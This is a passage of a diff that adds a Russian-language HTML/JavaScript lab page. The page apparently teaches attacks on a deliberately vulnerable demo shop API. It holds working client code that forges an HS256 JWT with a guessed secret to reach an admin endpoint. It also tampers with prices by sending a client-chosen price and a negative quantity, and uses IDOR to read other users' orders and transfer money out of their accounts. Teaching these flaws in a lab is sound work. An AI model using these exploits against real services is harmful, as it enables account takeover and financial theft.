+          <div class="success-banner" id="jwtf-b1">✅ Поддельный токен создан! Переходим к шагу 2 — используем его.</div>
+        </div>
+      </div>
+
+      <div class="step-card" id="jwtf-s2">
+        <div class="step-header">
+          <div class="step-num">2</div>
+          <div><div class="step-title">Использовать токен: зайти как admin</div>
+          <div class="step-subtitle">Запросить список всех пользователей</div></div>
+        </div>
+        <div class="step-body">
+          <p class="step-explain">
+            Используем поддельный токен для запроса <code style="background:var(--surface2);padding:1px 5px;border-radius:3px;">GET /api/auth/users</code> — эндпоинт только для администраторов.
+            Если сервер примет наш токен — взлом удался.
+          </p>
+          <div class="action-row">
+            <button class="btn btn-danger" onclick="jwtUse()">🚪 Войти по поддельному токену</button>
+          </div>
+          <div class="result-box" id="jwtf-r2"></div>
+          <div class="success-banner" id="jwtf-b2">🎉 ВЗЛОМ! Сервер принял поддельный токен! Список всех пользователей получен.</div>
+          <div class="mark-done-btn" id="jwtf-done">
+            <button class="btn btn-secondary" onclick="markDone(5); showVuln(6)">✓ Отметить как выполнено → VULN-6</button>
+          </div>
+        </div>
+      </div>
+    </div>`;
+}
+
+let forgedToken = null;
+
+async function jwtForge() {
+  const secret = document.getElementById('jwt-secret').value;
+  const target = document.getElementById('jwt-target').value;
+  log('INFO', 'Создаём поддельный JWT с секретом "' + secret + '" для пользователя: ' + target);
+  try {
+    const header = {alg: 'HS256', typ: 'JWT'};
+    const payload = {
+      userId: target === 'admin' ? '1' : '2',
+      username: target,
+      'http://schemas.microsoft.com/ws/2008/06/identity/claims/role': target === 'admin' ? 'admin' : 'user'
+    };
+    const b64url = s => btoa(JSON.stringify(s)).replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_');
+    const sigInput = b64url(header) + '.' + b64url(payload);
+    const key = await crypto.subtle.importKey('raw', new TextEncoder().encode(secret), {name:'HMAC', hash:'SHA-256'}, false, ['sign']);
+    const sig = await crypto.subtle.sign('HMAC', key, new TextEncoder().encode(sigInput));
+    const b64sig = btoa(String.fromCharCode(...new Uint8Array(sig))).replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_');
+    forgedToken = sigInput + '.' + b64sig;
+    const box = document.getElementById('jwtf-r1');
+    box.className = 'result-box show';
+    box.innerHTML = '<span class="result-success">✓ ТОКЕН СОЗДАН!\n\nПодпись вычислена с секретом: "' + escHtml(secret) + '"\nPaylod:\n' + escHtml(JSON.stringify(payload, null, 2)) + '\n\nТокен (первые 80 символов):\n' + escHtml(forgedToken.slice(0,80)) + '...</span>';
+    document.getElementById('jwtf-b1').classList.add('show');
+    document.getElementById('jwtf-s2').classList.add('active');
+    log('HACK', 'Поддельный токен для ' + target + ' создан!');
+    incExp();
+  } catch(e) { log('ERROR', 'Ошибка создания токена: ' + e.message); }
+}
+
+async function jwtUse() {
+  if (!forgedToken) { log('WARN', 'Сначала создайте поддельный токен в шаге 1!'); return; }
+  log('INFO', 'Используем поддельный токен для GET /api/auth/users...');
+  incReq();
+  try {
+    const r = await apiFetch('GET', '/api/auth/users', null, forgedToken);
+    const box = document.getElementById('jwtf-r2');
+    box.className = 'result-box show';
+    const text = await r.text();
+    const data = JSON.parse(text);
+    if (r.ok && Array.isArray(data)) {
+      box.innerHTML = '<span class="result-success">🎯 ВЗЛОМ УДАЛСЯ!\n\nСервер принял поддельный токен.\nСписок пользователей (' + data.length + ' шт):\n\n' + escHtml(JSON.stringify(data, null, 2).slice(0,600)) + '</span>';
+      document.getElementById('jwtf-b2').classList.add('show');
+      document.getElementById('jwtf-done').classList.add('show');
+      log('HACK', '🎉 JWT подделка прошла! Получено ' + data.length + ' пользователей.');
+      incExp();
+    } else {
+      box.innerHTML = '<span class="result-info">HTTP ' + r.status + '\n' + escHtml(text.slice(0,300)) + '</span>';
+      if (r.status === 403) {
+        log('INFO', 'HTTP 403 — возможно токен принят, но у пользователя нет прав admin');
+        document.getElementById('jwtf-done').classList.add('show');
+      } else {
+        log('WARN', 'Сервер вернул: HTTP ' + r.status);
+      }
+    }
+  } catch(e) { log('ERROR', e.message); }
+}
+
+// ══════════════════════════════════════════════════════
+// VULN-6: PRICE MANIPULATION
+// ══════════════════════════════════════════════════════
+function vuln6() {
+  document.getElementById('mainContent').innerHTML = `
+    <div class="vuln-header">
+      <div class="vuln-title-row">
+        <span class="vuln-badge badge-high" style="font-size:13px;padding:4px 12px;">HIGH</span>
+        <h1 class="vuln-title">VULN-6: Подделка цены</h1>
+      </div>
+      <p class="vuln-desc">
+        Сервер принимает цену товара от самого покупателя. Это как прийти в магазин и самому написать цену на ценнике.
+        Можно купить ноутбук за 0.01 рубль — или указать отрицательное количество и получить деньги.
+      </p>
+    </div>
+    <div class="steps-container">
+      <div class="step-card active">
+        <div class="step-header">
+          <div class="step-num">1</div>
+          <div><div class="step-title">Проверить баланс до покупки</div></div>
+        </div>
+        <div class="step-body">
+          <p class="step-explain">Посмотрим текущий баланс пользователя alice — чтобы было с чем сравнить после атаки.</p>
+          <div class="action-row">
+            <button class="btn btn-primary" onclick="priceCheckBalance('before')">▶ Проверить баланс сейчас</button>
+          </div>
+          <div class="result-box" id="price-r0"></div>
+        </div>
+      </div>
+
+      <div class="step-card">
+        <div class="step-header">
+          <div class="step-num">2</div>
+          <div><div class="step-title">Купить товар по своей цене</div>
+          <div class="step-subtitle">Ноутбук за 49999 ₽ — купим за копейку</div></div>
+        </div>
+        <div class="step-body">
+          <p class="step-explain">
+            Отправляем покупку с параметром <code style="background:var(--surface2);padding:1px 5px;border-radius:3px;">clientPrice</code>.
+            Сервер использует нашу цену вместо реальной — это логическая ошибка.
+          </p>
+          <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin-bottom:10px;">
+            <div>
+              <span class="field-label">ID товара</span>
+              <input class="input-field" id="price-pid" value="1" type="number">
+            </div>
+            <div>
+              <span class="field-label">Количество</span>
+              <input class="input-field" id="price-qty" value="1" type="number">
+            </div>
+            <div>
+              <span class="field-label">Наша цена (₽)</span>
+              <input class="input-field" id="price-val" value="0.01" type="number" step="0.01">
+            </div>
+          </div>
+          <div class="action-row">
+            <button class="btn btn-danger" onclick="priceExploit()">💸 Купить по своей цене!</button>
+          </div>
+          <div class="result-box" id="price-r1"></div>
+          <div class="success-banner" id="price-b1">✅ Покупка оформлена по нашей цене!</div>
+        </div>
+      </div>
+
+      <div class="step-card">
+        <div class="step-header">
+          <div class="step-num">3</div>
+          <div><div class="step-title">Отрицательное количество — получить деньги</div>
+          <div class="step-subtitle">Ещё хуже: quantity = -1 → баланс растёт</div></div>
+        </div>
+        <div class="step-body">
+          <p class="step-explain">
+            Указываем количество <strong>-1</strong>. Цена товара ~2499 ₽, totalPrice = 2499 × (-1) = <strong>-2499 ₽</strong>.
+            Отрицательное списание = пополнение счёта. Деньги из воздуха!
+          </p>
+          <div class="action-row">
+            <button class="btn btn-danger" onclick="priceNegative()">⬆ Получить деньги через quantity=-1</button>
+            <button class="btn btn-secondary" onclick="priceCheckBalance('after')">Проверить баланс после</button>
+          </div>
+          <div class="result-box" id="price-r2"></div>
+          <div class="success-banner" id="price-b2">🤑 Баланс пополнен! Деньги созданы из воздуха.</div>
+          <div class="mark-done-btn" id="price-done">
+            <button class="btn btn-secondary" onclick="markDone(6); showVuln(7)">✓ Отметить как выполнено → VULN-7</button>
+          </div>
+        </div>
+      </div>
+    </div>`;
+}
+
+async function ensureToken() {
+  if (!currentToken) {
+    const r = await apiFetch('POST', '/api/auth/login', {username:'alice', password:'alice123'}, null);
+    const d = await r.json();
+    if (d.token) { currentToken = d.token; log('INFO', 'Авторизован как alice'); incReq(); }
+  }
+}
+
+async function priceCheckBalance(when) {
+  await ensureToken();
+  log('INFO', 'Проверяем баланс (GET /api/auth/me)...');
+  incReq();
+  try {
+    const r = await apiFetch('GET', '/api/auth/me', null, currentToken);
+    const d = await r.json();
+    const boxId = when === 'before' ? 'price-r0' : 'price-r2';
+    const box = document.getElementById(boxId);
+    box.className = 'result-box show';
+    box.innerHTML = '<span class="result-info">' + when.toUpperCase() + ' АТАКИ:\nПользователь: ' + escHtml(d.username) + '\nБаланс: ' + escHtml(String(d.balance)) + ' ₽\n</span>';
+    log('INFO', 'Баланс ' + d.username + ': ' + d.balance + ' ₽');
+  } catch(e) { log('ERROR', e.message); }
+}
+
+async function priceExploit() {
+  await ensureToken();
+  const pid = parseInt(document.getElementById('price-pid').value) || 1;
+  const qty = parseInt(document.getElementById('price-qty').value) || 1;
+  const price = parseFloat(document.getElementById('price-val').value) || 0.01;
+  log('HACK', 'Покупка товара #' + pid + ' за ' + price + ' ₽ вместо реальной цены...');
+  incReq();
+  try {
+    const r = await apiFetch('POST', '/api/orders/purchase', {productId: pid, quantity: qty, clientPrice: price}, currentToken);
+    const d = await r.json();
+    const box = document.getElementById('price-r1');
+    box.className = 'result-box show';
+    if (r.ok) {
+      box.innerHTML = '<span class="result-success">✓ ПОКУПКА ОФОРМЛЕНА!\n\n' + escHtml(JSON.stringify(d, null, 2)) + '</span>';
+      document.getElementById('price-b1').classList.add('show');
+      log('HACK', '💸 Покупка по цене ' + price + ' ₽ вместо реальной! Ответ: ' + JSON.stringify(d));
+      incExp();
+    } else {
+      box.innerHTML = '<span class="result-warn">HTTP ' + r.status + '\n' + escHtml(JSON.stringify(d)) + '</span>';
+      log('WARN', 'Сервер вернул: HTTP ' + r.status);
+    }
+  } catch(e) { log('ERROR', e.message); }
+}
+
+async function priceNegative() {
+  await ensureToken();
+  log('HACK', 'Отправляем quantity=-1 для получения денег...');
+  incReq();
+  try {
+    const r = await apiFetch('POST', '/api/orders/purchase', {productId: 5, quantity: -1}, currentToken);
+    const d = await r.json();
+    const box = document.getElementById('price-r2');
+    box.className = 'result-box show';
+    if (r.ok) {
+      box.innerHTML = '<span class="result-success">💰 ДЕНЬГИ ПОЛУЧЕНЫ!\n\n' + escHtml(JSON.stringify(d, null, 2)) + '\n\nПроверьте баланс — он должен увеличиться!</span>';
+      document.getElementById('price-b2').classList.add('show');
+      document.getElementById('price-done').classList.add('show');
+      log('HACK', '🤑 quantity=-1 сработал! Баланс пополнен. Ответ: ' + JSON.stringify(d));
+      incExp();
+    } else {
+      box.innerHTML = '<span class="result-warn">HTTP ' + r.status + '\n' + escHtml(JSON.stringify(d)) + '</span>';
+      log('WARN', 'Сервер вернул: HTTP ' + r.status + ' — возможно патч применён');
+      document.getElementById('price-done').classList.add('show');
+    }
+  } catch(e) { log('ERROR', e.message); }
+}
+
+// ══════════════════════════════════════════════════════
+// VULN-7: IDOR
+// ══════════════════════════════════════════════════════
+function vuln7() {
+  document.getElementById('mainContent').innerHTML = `
+    <div class="vuln-header">
+      <div class="vuln-title-row">
+        <span class="vuln-badge badge-critical" style="font-size:13px;padding:4px 12px;">CRITICAL</span>
+        <h1 class="vuln-title">VULN-7: IDOR (доступ к чужим данным)</h1>
+      </div>
+      <p class="vuln-desc">
+        IDOR (Insecure Direct Object Reference) — сервер не проверяет, принадлежат ли тебе данные, которые ты запрашиваешь.
+        Как если бы ячейки в банке были пронумерованы 1,2,3 — и любой мог открыть любую, зная номер.
+      </p>
+    </div>
+    <div class="steps-container">
+      <div class="step-card active">
+        <div class="step-header">
+          <div class="step-num">1</div>
+          <div><div class="step-title">Войти как bob — смотреть заказы alice</div>
+          <div class="step-subtitle">bob не должен видеть чужие заказы!</div></div>
+        </div>
+        <div class="step-body">
+          <p class="step-explain">
+            Авторизуемся как bob, затем запросим заказ с ID=1, который принадлежит другому пользователю.
+            Сервер должен вернуть ошибку 403 (запрещено) — но не делает этого.
+          </p>
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:10px;">
+            <div><span class="field-label">Логин</span><input class="input-field" id="idor-u" value="bob"></div>
+            <div><span class="field-label">Пароль</span><input class="input-field" id="idor-p" value="bob123"></div>
+          </div>
+          <div class="action-row">
+            <button class="btn btn-primary" onclick="idorLogin()">▶ Войти как bob</button>
+          </div>
+          <div class="result-box" id="idor-r1"></div>
+          <div class="success-banner" id="idor-b1">✅ Вошли как bob. Теперь запросим чужой заказ.</div>
+        </div>
+      </div>
+
+      <div class="step-card" id="idor-s2">
+        <div class="step-header">
+          <div class="step-num">2</div>
+          <div><div class="step-title">Просмотр чужого заказа</div>
+          <div class="step-subtitle">Перебираем ID от 1 до N</div></div>
+        </div>
+        <div class="step-body">
+          <p class="step-explain">
+            Запрашиваем заказ по номеру. Если сервер не проверяет владельца — мы увидим чужие данные.
+          </p>
+          <div>
+            <span class="field-label">ID заказа для просмотра</span>
+            <input class="input-field" id="idor-oid" value="1" type="number">
+          </div>
+          <div class="action-row">
+            <button class="btn btn-danger" onclick="idorViewOrder()">👁 Просмотреть чужой заказ</button>
+          </div>
+          <div class="result-box" id="idor-r2"></div>
+          <div class="success-banner" id="idor-b2">😱 IDOR сработал! bob видит чужой заказ без разрешения!</div>
+        </div>
+      </div>
+
+      <div class="step-card" id="idor-s3">
+        <div class="step-header">
+          <div class="step-num">3</div>
+          <div><div class="step-title">Перевести деньги с чужого счёта</div>
+          <div class="step-subtitle">Самое опасное: финансовый IDOR</div></div>
+        </div>
+        <div class="step-body">
+          <p class="step-explain">
+            Делаем перевод денег, указывая что <em>отправитель</em> — другой пользователь.
+            Сервер не проверяет, является ли текущий пользователь владельцем счёта-отправителя.
+          </p>
+          <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin-bottom:10px;">
+            <div><span class="field-label">С аккаунта (ID)</span><input class="input-field" id="idor-from" value="1" type="number"></div>
+            <div><span class="field-label">На аккаунт (ID)</span><input class="input-field" id="idor-to" value="3" type="number"></div>
+            <div><span class="field-label">Сумма (₽)</span><input class="input-field" id="idor-amt" value="500" type="number"></div>
+          </div>
+          <div class="action-row">
+            <button class="btn btn-danger" onclick="idorTransfer()">💰 Перевести чужие деньги</button>
+          </div>
+          <div class="result-box" id="idor-r3"></div>
+          <div class="success-banner" id="idor-b3">🤑 ВЗЛОМ! Деньги переведены с чужого счёта без его ведома!</div>
+          <div class="mark-done-btn" id="idor-done">
+            <button class="btn btn-secondary" onclick="markDone(7); showVuln(1)">🏆 Все 7 уязвимостей выполнены! На главную</button>
+          </div>
+        </div>
+      </div>
+    </div>`;
+}
+
+let bobToken = null;
+
+async function idorLogin() {
+  const u = document.getElementById('idor-u').value;
+  const p = document.getElementById('idor-p').value;
+  log('INFO', 'Авторизация как ' + u + '...');
+  incReq();
+  try {
+    const r = await apiFetch('POST', '/api/auth/login', {username: u, password: p}, null);
+    const d = await r.json();
+    const box = document.getElementById('idor-r1');
+    box.className = 'result-box show';
+    if (d.token) {
+      bobToken = d.token;
+      box.innerHTML = '<span class="result-success">✓ Вошли как ' + escHtml(u) + '\n\nJWT: ' + escHtml(d.token.slice(0,50)) + '...</span>';
+      document.getElementById('idor-b1').classList.add('show');
+      document.getElementById('idor-s2').classList.add('active');
+      document.getElementById('idor-s3').classList.add('active');
+      log('SUCCESS', 'Авторизован как ' + u);
+    } else {
+      box.innerHTML = '<span class="result-error">' + escHtml(JSON.stringify(d)) + '</span>';
+      log('ERROR', 'Авторизация не удалась');
+    }
+  } catch(e) { log('ERROR', e.message); }
+}
+
+async function idorViewOrder() {
+  if (!bobToken) { log('WARN', 'Сначала выполните шаг 1!'); return; }
+  const oid = document.getElementById('idor-oid').value;
+  log('HACK', 'bob запрашивает заказ #' + oid + ' (возможно чужой)...');
+  incReq();
+  try {
+    const r = await apiFetch('GET', '/api/orders/' + oid, null, bobToken);
+    const box = document.getElementById('idor-r2');
+    box.className = 'result-box show';
+    if (r.ok) {
+      const d = await r.json();
+      box.innerHTML = '<span class="result-success">📦 ЧУЖОЙ ЗАКАЗ ПОЛУЧЕН!\n\n' + escHtml(JSON.stringify(d, null, 2).slice(0, 500)) + '</span>';
+      document.getElementById('idor-b2').classList.add('show');
+      log('HACK', 'IDOR! bob получил заказ #' + oid + ': ' + JSON.stringify(d).slice(0,100));
+      incExp();
+    } else if (r.status === 403 || r.status === 404) {
+      const text = await r.text();
+      box.innerHTML = '<span class="result-info">HTTP ' + r.status + ' — сервер запретил доступ (патч применён)\n' + escHtml(text.slice(0,200)) + '</span>';
+      log('INFO', 'HTTP ' + r.status + ' — защита работает или заказ не найден');
+      document.getElementById('idor-b2').classList.add('show');
+      document.getElementById('idor-b2').textContent = '✓ Попытка зафиксирована (HTTP ' + r.status + ')';
+      document.getElementById('idor-b2').style.background = 'var(--yellow-bg)';
+      document.getElementById('idor-b2').style.color = 'var(--yellow)';
+      document.getElementById('idor-b2').style.borderColor = '#6b5000';
+    } else {
+      box.innerHTML = '<span class="result-warn">HTTP ' + r.status + '</span>';
+      log('WARN', 'Ответ: HTTP ' + r.status);
+    }
+  } catch(e) { log('ERROR', e.message); }
+}
+
+async function idorTransfer() {
+  if (!bobToken) { log('WARN', 'Сначала выполните шаг 1!'); return; }
+  const from = parseInt(document.getElementById('idor-from').value);
+  const to = parseInt(document.getElementById('idor-to').value);
+  const amt = parseFloat(document.getElementById('idor-amt').value);
+  log('HACK', 'Попытка перевода ' + amt + ' ₽ с аккаунта #' + from + ' на #' + to + ' (под токеном bob)...');
+  incReq();
+  try {
+    const r = await apiFetch('POST', '/api/orders/transfer', {fromUserId: from, toUserId: to, amount: amt}, bobToken);
+    const box = document.getElementById('idor-r3');
+    box.className = 'result-box show';
+    const text = await r.text();
+    if (r.ok) {
+      box.innerHTML = '<span class="result-success">💸 ПЕРЕВОД ВЫПОЛНЕН!\n\n' + escHtml(text) + '\n\nbob перевёл ' + amt + ' ₽ с аккаунта #' + from + ' на #' + to + '\nбез ведома владельца счёта!</span>';
+      document.getElementById('idor-b3').classList.add('show');
+      document.getElementById('idor-done').classList.add('show');
+      log('HACK', '🤑 IDOR Transfer! Переведено ' + amt + ' ₽ с аккаунта #' + from);
+      incExp();
+    } else {
+      box.innerHTML = '<span class="result-info">HTTP ' + r.status + '\n' + escHtml(text.slice(0,300)) + '</span>';
+      log('WARN', 'Перевод заблокирован: HTTP ' + r.status);
+      document.getElementById('idor-done').classList.add('show');
+    }
+  } catch(e) { log('ERROR', e.message); }
+}
+
+// ─── COPY CODE HELPER ─────────────────────────────────
+function copyCode(btn, id) {
+  const el = document.getElementById(id);
+  if (!el) return;
+  navigator.clipboard.writeText(el.textContent).then(() => {
+    btn.textContent = '✓ скопировано';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'копировать'; btn.classList.remove('copied'); }, 1500);
+  });
+}
+
+// ─── INIT ─────────────────────────────────────────────
+showWelcome();
+setTimeout(checkConnection, 800);
+</script>
+</body>
+</html>
